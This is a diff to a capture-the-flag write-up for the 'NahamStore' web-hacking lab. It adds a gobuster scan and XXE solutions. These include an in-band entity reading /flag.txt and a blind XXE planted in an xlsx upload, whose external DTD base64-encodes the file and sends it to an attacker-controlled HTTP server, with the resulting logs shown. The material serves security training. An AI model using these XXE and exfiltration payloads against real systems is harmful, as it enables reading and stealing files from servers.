@@ -1,12 +1,12 @@
 # NahamStore Writeup
 
-> Machine : Web
+> Machine : Linux
 
 > In this room you will learn the basics of bug bounty hunting and web application hacking
 
 ## Solution
 
-First reconnaissance and port scanning and setup the requirement.
+First reconnaissance, port scanning and setup the requirement.
 
 ```shell
 nmap -sV -sC -Pn --open -T4 nahamstore.thm -p-
@@ -60,6 +60,26 @@ Adding all the requirement to `/etc/hosts` we get this:
 ::1     localhost ip6-localhost ip6-loopback
 ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
+```
+
+Let's also find the hidden directories using `gobuster`.
+
+```shell
+gobuster dir -u "http://nahamstore.thm/" -w /usr/share/wordlists/dirb/common.txt
+```
+
+```text
+basket               (Status: 200) [Size: 2465]
+css                  (Status: 301) [Size: 178] [--> http://127.0.0.1/css/]
+js                   (Status: 301) [Size: 178] [--> http://127.0.0.1/js/]
+login                (Status: 200) [Size: 3099]
+logout               (Status: 302) [Size: 0] [--> /]
+register             (Status: 200) [Size: 3138]
+returns              (Status: 200) [Size: 3628]
+robots.txt           (Status: 200) [Size: 13]
+search               (Status: 200) [Size: 3351]
+staff                (Status: 200) [Size: 2287]
+uploads              (Status: 301) [Size: 178] [--> http://127.0.0.1/uploads/]
 ```
 
 Now we can start the room starting with XSS into SQLi. Don't worry about task 3 we can't answer it right now.
@@ -256,4 +276,129 @@ Entering `server=stock.nahamstore.thm@internal-api.nahamstore.thm/orders/4dbc517
 > 5190216301622131
 
 ### Task 10 (XXE)
+
+Entering http://stock.nahamstore.thm/product/1 we found earlier. We can see the products in stock. Interception the request and change the method to POST then search for hidden parameters using `arjun` we found `xml parameter`. 
+
+Sending the request we got a data:
+
+```xml
+<?xml version="1.0"?>
+<data><error>Invalid XML supplied</error></data>
+```
+
+After adding the data to our request and change the `<error>` by `<X-Token>`, then add a payload from https://github.com/swisskyrepo/PayloadsAllTheThings.
+Our request become like this:
+
+```xml
+POST /product/1?xml HTTP/1.1
+Host: stock.nahamstore.thm
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/151.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 121
+
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///flag.txt'>]>
+<data><X-Token>&test;</X-Token></data>
+```
+
+And the respond become like this:
+
+```xml
+<?xml version="1.0"?>
+<data><error>X-Token {9f18bd8b9acaada53c4c643744401ea8}
+is invalid</error></data>
+```
+
+> XXE Flag
+> 
+> {9f18bd8b9acaada53c4c643744401ea8}
+
+Now let's find the next one.
+
+Browsing http://nahamstore.thm/staff we saw a place where we can upload `xlsx files`. We can use it to inject malicious <!ENTITY> definitions into internal XML sheets. 
+This is the steps to exploit it: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/README.md#xxe-inside-xlsx-file
+
+First create a directory to work in.
+
+```shell
+mkdir XXE
+cd XXE
+```
+
+Then you have to create a blank xlsx template using Excel or LibreOffice. And decompress it.
+
+```shell
+unzip template.xlsx
+
+Archive:  template.xlsx
+  inflating: docProps/app.xml        
+  inflating: docProps/core.xml       
+  inflating: xl/theme/theme1.xml     
+  inflating: xl/worksheets/sheet1.xml  
+  inflating: xl/styles.xml           
+  inflating: _rels/.rels             
+  inflating: xl/workbook.xml         
+  inflating: xl/_rels/workbook.xml.rels  
+  inflating: [Content_Types].xml     
+```
+
+Then create the payload.
+
+```shell
+nano xl/workbook.xml
+
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE cdl [<!ELEMENT cdl ANY ><!ENTITY % asd SYSTEM "http://192.168.130.58/xxe.dtd">%asd;%c;]>
+<cdl>&rrr;</cdl>
+<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
+```
+
+Now we have to compress the files again in new xlsx file. We name it `xxe.xlsx`.
+
+```shell
+7z u xxe.xlsx xl docProps _rels '[Content_Types].xml'
+```
+
+Now let's create the `xxe.dtd` file.
+
+```shell
+nano xxe.dtd
+
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/flag.txt">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://192.168.130.58/?data=%file;'>">
+%eval;
+%exfiltrate;
+```
+
+After that you can use FTP server to save the logs and read the file. But in this case we can read the file only from the HTTP server.
+
+```shell
+python3 -m http.server 80
+```
+
+```text
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.128.134.242 - - [25/Oct/2026 16:18:47] "GET /xxe.dtd HTTP/1.0" 200 -
+10.128.134.242 - - [25/Oct/2026 16:21:32] "GET /xxe.dtd HTTP/1.0" 200 -
+10.128.134.242 - - [25/Oct/2026 16:21:32] "GET /?data=e2Q2YjIyY2IzZTM3YmVmMzJkODAwMTA1YjExMTA3ZDhmfQo= HTTP/1.0" 200 -
+```
+
+```shell
+echo "e2Q2YjIyY2IzZTM3YmVmMzJkODAwMTA1YjExMTA3ZDhmfQo=" | base64 -d
+```
+
+```text
+{d6b22cb3e37bef32d800105b11107d8f}
+```
+
+> Blind XXE Flag
+> 
+> {d6b22cb3e37bef32d800105b11107d8f}
+
+### Task 11 (RCE)
 
